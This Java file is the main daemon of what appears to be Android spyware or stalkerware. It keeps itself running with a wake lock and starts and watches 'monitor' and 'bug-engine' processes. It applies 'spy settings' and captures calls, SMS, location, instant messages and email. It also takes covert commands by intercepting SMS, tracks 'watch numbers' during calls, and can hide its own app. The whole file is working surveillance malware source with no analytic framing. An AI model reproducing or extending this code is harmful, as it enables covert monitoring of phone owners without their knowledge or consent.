package com.fx.maind;

import java.io.IOException;
import java.util.concurrent.Callable;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;

import com.fx.activation.ActivationHelper;
import com.fx.daemon.DaemonHelper;
import com.fx.daemon.util.CrashReporter;
import com.fx.daemon.util.WatchingProcess;
import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.dalvik.smscommand.SmsCommandManager;
import com.fx.database.FxDatabaseHelper;
import com.fx.event.Event;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.maind.ref.command.RemoteRemoveApk;
import com.fx.maind.ref.command.RemoteUninstallAll;
import com.fx.pmond.ref.MonitorDaemon;
import com.fx.pmond.ref.MonitorDaemonResource;
import com.fx.pmond.ref.command.RemoteAddProcess;
import com.fx.preference.PreferenceManager;
import com.fx.socket.RemoteCheckAlive;
import com.fx.socket.RemoteCheckSync;
import com.fx.socket.RemoteSetSync;
import com.fx.socket.RemoteSetSync.SyncData;
import com.fx.socket.SocketCmd;
import com.fx.socket.SocketCmdServer;
import com.fx.util.FxUtil;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.BugDaemon;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.InterceptingSms;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.command.RemoteForwardInterceptingSms;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallActive;
import com.vvt.callmanager.ref.command.RemoteNotifyOnMonitorDisconnect;
import com.vvt.dalvik.thread.SimChangeThread;
import com.vvt.logger.FxLog;
import com.vvt.shell.ShellUtil;
import com.vvt.timer.TimerBase;

public class MainDaemonMain {
	
	private static final String TAG = "MainDaemonMain";
	
	private static boolean LOGV = Customization.VERBOSE;
	private static boolean LOGD = Customization.DEBUG;
	private static boolean LOGE = Customization.ERROR;
	
	private static Context sContext;
	private static LicenseManager sLicenseManager;
	private static PreferenceManager sPreferenceManager;
	private static ServiceManager sServiceManager;
	private static SocketCmdServer sSocketCmdServer;
	private static WakeLock sWakeLock;
	
	public static void main(String[] args) {
		Thread.setDefaultUncaughtExceptionHandler(new CrashReporter(TAG, mCallbackOnError));
		
		DaemonHelper.initLog(
				MainDaemonResource.LOG_FOLDER, 
				MainDaemonResource.LOG_FILENAME);
		
		if (LOGV) FxLog.v(TAG, "main # ENTER ...");
		
		String processName = MainDaemonResource.PROCESS_NAME;
		
		if (ShellUtil.isProcessRunning(processName)) {
			if (LOGE) FxLog.e(TAG, "main # Daemon is already running!");
			ShellUtil.killSelf();
			return;
		}
		
		DaemonHelper.setProcessName(processName);
		
		if (LOGD) FxLog.d(TAG, "main # Waiting until the system is ready ...");
		DaemonHelper.waitSystemReady();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.prepare() ...");
		Looper.prepare();
		
		if (LOGD) FxLog.d(TAG, "main # Create system context ...");
    	sContext = DaemonHelper.getSystemContext();
    	if (sContext == null) {
			if (LOGE) FxLog.e(TAG, "main # Create SystemContext FAILED!! -> EXIT");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (acquireWakeLock(sContext)) {
			if (LOGD) FxLog.d(TAG, "main # PARTIAL_WAKE_LOCK acquired!");
		}
		else {
			if (LOGE) FxLog.e(TAG, "main # Acquire WakeLock FAILED!!");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (LOGD) FxLog.d(TAG, "main # Prepare server socket ...");
    	boolean isServerSocketCreated = prepareServerSocket();
    	if (! isServerSocketCreated) {
    		if (LOGE) FxLog.e(TAG, "main # Create server socket FAILED!!");
			ShellUtil.killSelf();
			return;
    	}
    	
    	// This observer should be alive and die with the looper
		if (LOGD) FxLog.d(TAG, "main # Keep observe when the monitor is startup");
		registerOnMonitoringProcessStartup();
		
		if (LOGD) FxLog.d(TAG, "Synchronize with monitor process");
		syncMonitor();
		
		if (LOGD) FxLog.d(TAG, "main # Initialize databases ...");
		initDatabases();
		
		if (LOGD) FxLog.d(TAG, "main # Keep observe when the bug-engine is startup");
		registerOnBugProcessStartup();
		
		if (LOGD) FxLog.d(TAG, "Synchronize with bug-engine process");
		syncBug();
		
		if (LOGD) FxLog.d(TAG, "main # Start SIM Change Monitoring");
    	SimChangeThread t = new SimChangeThread(sContext);
    	t.enable();
		
		if (LOGD) FxLog.d(TAG, "main # Register onActivationSuccess");
		registerOnActivationSuccess();
		
		if (LOGD) FxLog.d(TAG, "main # Register onDeactivationSuccess");
		registerOnDectivationSuccess();
		
		// Start services if the product is already activated
    	if (sLicenseManager.isActivated()) {
    		if (LOGD) FxLog.d(TAG, "main # Product is already activated");
    		
			if (sPreferenceManager.isCaptureEnabled()) {
				if (LOGD) FxLog.d(TAG, "main # Start capturing system");
				
				sServiceManager.updateEventCaptureStatus();
				sServiceManager.processNumberOfEvents();
				sServiceManager.restartDeliveryScheduler();
			}
		}
    	
    	if (LOGD) FxLog.d(TAG, "main # Start routine task");
    	startRoutineTask();
		
		if (LOGD) FxLog.d(TAG, "main # Notify startup success");
		notifyStartupSuccess();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.loop()");
		Looper.loop();
    	
    	if (LOGV) FxLog.v(TAG, "main # EXIT");
	}
	
	// gets called when unhandled exception occured!
	private static Callable<Void> mCallbackOnError =  new Callable<Void>() {
		@Override
		public Void call() throws Exception {
			if (LOGV) FxLog.v(TAG, "mCallbackOnError call # ENTER ...");
			if(sSocketCmdServer != null)
				sSocketCmdServer.closeServer();
			if (LOGV) FxLog.v(TAG, "mCallbackOnError call # EXIT ...");
			return null;
		}
	};

	private static void registerOnMonitoringProcessStartup() {
		if (sContext != null) {
			ContentObserver observer = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGD) FxLog.d(TAG, "Receive monitor startup notification");
					if (LOGD) FxLog.d(TAG, "Synchronizing ...");
					syncMonitor();
				}
			};
			sContext.getContentResolver().registerContentObserver(
					MonitorDaemonResource.URI_STARTUP_SUCCESS, false, observer);
		}
	}
	
	private static void registerOnBugProcessStartup() {
		if (sContext != null) {
			ContentObserver observer = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGD) FxLog.d(TAG, "Receive bug-engine startup notification");
					if (LOGD) FxLog.d(TAG, "Synchronizing ...");
					syncBug();
				}
			};
			sContext.getContentResolver().registerContentObserver(
					BugDaemonResource.URI_STARTUP_SUCCESS, true, observer);
		}
	}
	
	private static void registerOnActivationSuccess() {
		if (sContext != null) {
			ContentObserver observer = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGD) FxLog.d(TAG, "Receive activation success notification");
					
					// The message is broadcasted even the operation is failed
					// To avoid double updating, we better do check here
					if (sLicenseManager.isActivated()) {
						
						// Update event capture status
						sServiceManager.updateEventCaptureStatus();
						
						// Restart the scheduler
						sServiceManager.restartDeliveryScheduler();
					}
				}
			};
			sContext.getContentResolver().registerContentObserver(
					ActivationHelper.URI_ACTIVATION_SUCCESS, false, observer);
		}
	}
	
	private static void registerOnDectivationSuccess() {
		if (sContext != null) {
			ContentObserver observer = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGD) FxLog.d(TAG, "Receive deactivation success notification");
					
					// The message is broadcasted even the operation is failed
					// To avoid double updating, we better do check here
					if (! sLicenseManager.isActivated()) {
						
						// Reset spy settings
						sServiceManager.resetSpySettings();
						
						// Disable all capturing
						sServiceManager.disableCaptureCallLog();
						sServiceManager.disableCaptureSms();
						sServiceManager.disableCaptureLocation();
						
						// We still don't know the reason of this
						// but by calling the disable method this way 
						// can avoid the problem of sending SMS command responding message 
						// after the product is deactivated
						Thread t = new Thread() {
							public void run() {
								sServiceManager.disableCaptureIm();
							}
						};
						t.start();
						
						t = new Thread() {
							@Override
							public void run() {
								sServiceManager.disableCaptureEmail();
							}
						};
						t.start();
						
						// Stop delivery scheduler
						sServiceManager.stopDeliveryScheduler();
						
						// Remove all events
						sServiceManager.removeAllEvents();
					}
				}
			};
			sContext.getContentResolver().registerContentObserver(
					ActivationHelper.URI_DEACTIVATION_SUCCESS, false, observer);
		}
	}
	
	private static void startRoutineTask() {
		TimerBase timer = new TimerBase() {
			@Override
			public void onTimer() {
				if (LOGV) FxLog.v(TAG, "routineTask # Synchronizing with monitor process");
				syncMonitor();
				
				if (LOGV) FxLog.v(TAG, "routineTask # Synchronizing with bug-engine process");
				syncBug();
				
				if (LOGV) FxLog.v(TAG, "routineTask # Handle log file size");
				handleLogFileSize();
			}
		};
		timer.setTimerDurationMs(MainDaemonResource.MONITOR_INTERVAL);
		timer.start();
	}

	private static void syncMonitor() {
		if (LOGV) FxLog.v(TAG, "syncMonitor # ENTER ...");
		
		boolean isMonitorRunning = 
				ShellUtil.isProcessRunning(
						MonitorDaemonResource.PROCESS_NAME);
		
		if (LOGV) FxLog.v(TAG, String.format(
				"syncMonitor # Is monitor running? %s", isMonitorRunning));
		
		if (! isMonitorRunning) {
			if (LOGD) FxLog.d(TAG, "syncMonitor # Start monitor process");
			MonitorDaemon daemon = new MonitorDaemon();
			Uri startupSuccess = MonitorDaemonResource.URI_STARTUP_SUCCESS;
			DaemonHelper.startProcessAndWait(daemon, TAG, startupSuccess, 30*1000);
		}
		
		boolean isSync = false;
		
		RemoteCheckSync remoteCheckSync = new RemoteCheckSync(
				MonitorDaemonResource.SOCKET_NAME, 
				MainDaemonResource.PACKAGE_NAME);
		try { 
			isSync = remoteCheckSync.execute();
			if (LOGV) FxLog.v(TAG, String.format("syncMonitor # isSync? %s", isSync));
			
			if (! isSync) {
				if (LOGD) FxLog.d(TAG, "syncMonitor # Add watching process");
				addWatchingProcess();
				
				SyncData syncData = new SyncData();
				syncData.setClientPackage(MainDaemonResource.PACKAGE_NAME);
				syncData.setSync(true);
				
				RemoteSetSync remoteSetSync = new RemoteSetSync(
						MonitorDaemonResource.SOCKET_NAME, syncData);
				
				remoteSetSync.execute();
				if (LOGD) FxLog.d(TAG, "syncMonitor # Sync complete");
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("syncMonitor # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "syncMonitor # EXIT ...");
	}
	
	private static void syncBug() {
		if (LOGV) FxLog.v(TAG, "syncBug # ENTER ...");
		
		boolean isBugRunning = 
				ShellUtil.isProcessRunning(
						BugDaemonResource.CallMon.PROCESS_NAME);
		
		if (LOGV) FxLog.v(TAG, String.format(
				"syncBug # Is bug-engine running? %s", isBugRunning));
		
		if (! isBugRunning) {
			if (LOGD) FxLog.d(TAG, "syncBug # Start bug-engine");
			BugDaemon daemon = new BugDaemon();
			Uri startupSuccess = BugDaemonResource.URI_STARTUP_SUCCESS;
			DaemonHelper.startProcessAndWait(daemon, TAG, startupSuccess, 90*1000);
		}
		
		boolean isSync = false;
		
		RemoteCheckSync remoteCheckSync = new RemoteCheckSync(
				BugDaemonResource.CallMgr.SOCKET_NAME, 
				MainDaemonResource.PACKAGE_NAME);
		try { 
			isSync = remoteCheckSync.execute();
			if (LOGV) FxLog.v(TAG, String.format("syncBug # isSync? %s", isSync));
			
			if (! isSync) {
				if (LOGD) FxLog.d(TAG, "syncBug # Apply spy settings");
				sServiceManager.applySpySettings();
				
				SyncData syncData = new SyncData();
				syncData.setClientPackage(MainDaemonResource.PACKAGE_NAME);
				syncData.setSync(true);
				
				RemoteSetSync remoteSetSync = new RemoteSetSync(
						BugDaemonResource.CallMgr.SOCKET_NAME, syncData);
				
				remoteSetSync.execute();
				if (LOGD) FxLog.d(TAG, "syncBug # Sync complete");
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("syncBug # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "syncBug # EXIT ...");
	}

	private static void addWatchingProcess() {
		WatchingProcess watchProcess = new WatchingProcess();
		watchProcess.setProcessName(MainDaemonResource.PROCESS_NAME);
		watchProcess.setStartupScriptPath(MainDaemonResource.STARTUP_SCRIPT_PATH);
		watchProcess.setServerName(MainDaemonResource.SOCKET_NAME);
		
		RemoteAddProcess remoteCommand = new RemoteAddProcess(watchProcess);
		try {
			remoteCommand.execute();
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("addWatchingProcess # Error: %s", e));
		}
	}
	
	private static void initDatabases() {
		if (LOGV) FxLog.v(TAG, "initDatabases # ENTER ...");
		FxDatabaseHelper.initDatabases(sContext);
		
		EventDatabaseManager.getInstance(sContext);
		sServiceManager = ServiceManager.getInstance(sContext);
		sPreferenceManager = PreferenceManager.getInstance(sContext);
		sLicenseManager = LicenseManager.getInstance(sContext);
		
		if (LOGV) FxLog.v(TAG, "initDatabases # EXIT ...");
	}
	
	private static boolean acquireWakeLock(Context context) {
		PowerManager powerManager = 
				(PowerManager) context.getSystemService(Context.POWER_SERVICE);
		
		if (sWakeLock == null || !sWakeLock.isHeld()) {
			sWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
			sWakeLock.acquire();
		}
		
		return sWakeLock != null && sWakeLock.isHeld();
	}

	private static void handleLogFileSize() {
		String logPath = String.format("%s/%s", 
				MainDaemonResource.LOG_FOLDER, 
				MainDaemonResource.LOG_FILENAME);
		
		String logBakPath = String.format("%s.bak", logPath);
		
		DaemonHelper.handleLogFileSize(
				DaemonHelper.DEFAULT_LOG_SIZE, logPath, logBakPath);
	}

	private static void notifyStartupSuccess() {
		sContext.getContentResolver().notifyChange(
				MainDaemonResource.URI_STARTUP_SUCCESS, null);
	}

	private static boolean prepareServerSocket() {
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # ENTER ...");
		
		boolean isSuccess = false;
		
		try {
			sSocketCmdServer = new SocketCmdServer(TAG, MainDaemonResource.SOCKET_NAME) {
				@Override
				public Object process(SocketCmd<?, ?> command) {
					return processCommand(command);
				}
			};
			sSocketCmdServer.start();
			isSuccess = true;
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("prepareServerSocket # Error: %s", e));
			if (LOGE) FxLog.e(TAG, "prepareServerSocket # Reboot system ...");
			DaemonHelper.rebootDevice(sContext);
		}
		
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # EXIT ...");
		return isSuccess;
	}
	
	private static Object processCommand(SocketCmd<?, ?> command) {
		if (LOGV) FxLog.v(TAG, "processCommand # ENTER ...");
		
		Object response = null;
		
		if (command instanceof RemoteCheckAlive) {
			if (LOGV) FxLog.v(TAG, "processCommand # Check alive");
			response = true;
		}
		else if (command instanceof RemoteRemoveApk) {
			if (LOGD) FxLog.d(TAG, "processCommand # Remove APK");
			response = true;
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					sServiceManager.hideApplication();
				}
			};
			t.start();
		}
		
		else if (command instanceof RemoteUninstallAll) {
			if (LOGD) FxLog.d(TAG, "processCommand # Uninstall the application");
			response = true;
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					sServiceManager.uninstallAll();
				}
			};
			t.start();
		}
		
		else if (command instanceof RemoteForwardInterceptingSms) {
			if (LOGD) FxLog.d(TAG, "processCommand # Receive intercepting SMS");
			response = true;
			
			InterceptingSms sms = ((RemoteForwardInterceptingSms) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # %s", sms));
			
			final String number = sms.getNumber();
			final String message = sms.getMessage();
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					boolean isConsideredSmsCommand = 
							SmsCommandHelper.isConsideredSmsCommand(message);
					
					if (isConsideredSmsCommand) {
						FxUtil.captureSystemEvent(sContext, Event.DIRECTION_IN, message);
						SmsCommandManager.processSmsCommand(sContext, number, message);
					}
				}
			};
			t.start();
		}
		
		else if (command instanceof RemoteNotifyOnCallActive) {
			if (LOGD) FxLog.d(TAG, "processCommand # Receive on call active");
			
			final ActiveCallInfo activeCallInfo = 
					((RemoteNotifyOnCallActive) command).getData();
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					String phoneNumber = activeCallInfo.getNumber();
					boolean isIncoming = activeCallInfo.isIncoming();
					
					if (LOGD) FxLog.d(TAG, String.format(
							"processCommand # Found %s call session with number %s", 
							isIncoming ? "INCOMING" : "OUTGOING", phoneNumber));
					
					sServiceManager.handleWatchNumber(phoneNumber, isIncoming);
				}
			};
			t.start();
			
			response = true;
		}
		
		else if (command instanceof RemoteNotifyOnMonitorDisconnect) {
			if (LOGD) FxLog.d(TAG, "processCommand # Receive on monitor disconnect");
			final MonitorDisconnectData data = 
					((RemoteNotifyOnMonitorDisconnect) command).getData();
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					if (LOGD) FxLog.d(TAG, String.format("processCommand # Reason: %s", data.getReason()));
					sServiceManager.handleMonitorDisconnect(data);
				}
			};
			t.start();
			
			response = true;
		}
	
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		return response;
	}
	
	private static abstract class CommandExecutingThread extends Thread {
		final int DEFAULT_DELAY = 500;
		
		abstract void executeCommand();
		
		@Override
		public void run() {
			SystemClock.sleep(DEFAULT_DELAY);
			executeCommand();
		}
	}

}
